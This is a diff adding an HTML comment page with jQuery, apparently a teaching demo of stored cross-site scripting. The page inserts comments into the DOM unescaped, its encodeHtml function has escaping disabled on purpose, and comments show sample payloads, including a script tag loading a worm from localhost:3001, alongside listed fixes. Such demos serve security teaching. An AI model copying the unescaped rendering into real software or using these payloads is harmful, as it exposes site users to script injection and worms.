@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>评论页面</title>
+	<link rel="stylesheet" type="text/css" href="/node_modules/bootstrap/dist/css/bootstrap.css">
+</head>
+<body>
+	<div class="container">
+		<div class="row">
+			<div class="col-md-12">
+				<div class="cold-md-6 cold-md-offset-3">
+					<div class="panel panel-danger">
+						<div class="panel-heading">
+							<h2>评论页面</h2>
+						</div>
+						<div class="panel-body">
+							<ul class="list-group">
+							</ul>
+						</div>
+						<div class="panel-footer">
+							<form onsubmit="addComment(event)">
+								<div class="form-group">
+									<label for="content" class="control-label">内容</label>
+									<input type="text" id="content" class="form-control">
+								</div>
+								<div class="form-group">
+									<input type="submit" value="发表" class="btn btn-primary" />
+									<a href="/pay.html" class="btn btn-danger">去转帐</a>
+								</div>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script type="text/javascript" src="/node_modules/jquery/dist/jquery.js"></script>
+	<script type="text/javascript">
+		function getList() {
+			$.get("/api/list").then(res => {
+				if (res.code === 0) {
+					let html = ``
+					// 也可以在输出的时候过滤
+					res.comments.forEach(comment => {
+						html += `<li class="list-group-item">${comment.username} + ${comment.content}</li>`
+					})
+					$(".list-group").html(html)
+				}
+			})
+		}
+		getList()
+		function encodeHtml(str) {
+			// return str.replace(/&/g, "&amp;").replace(/"/g, "&quots;")
+			// 	.replace(/'/g, "&apos;")
+			// 	.replace(/</g, "&lt;")
+			// 	.replace(/>/g, "&gt;")
+
+
+			// 如果没有加过滤的话：<script src="http://localhost:3001/worm.js"><\/script>
+			return str
+		}
+		function addComment(evt) {
+			evt.preventDefault()
+			// 此时服务器里面存储的就是有问题
+			// <script>alert("1")<\/script>
+
+			// 发表评论
+			// 1- 解决方案：客户端传递给服务器的时候需要校验，先过滤一下
+			// 2- 后端再次做一下校验
+			// 3. 直接在输出的时候过滤
+			let content = encodeHtml($("#content").val())
+			$.post("/api/addcomment", {content}).then(res => {
+				console.log(res)
+				if (res.code === 1) {
+					location.href = "/login.html"
+				} else {
+					// 评论成功 的话，就是获取最新的
+					getList()
+				}
+			})
+		}
+	</script>
+</body>
+</html>
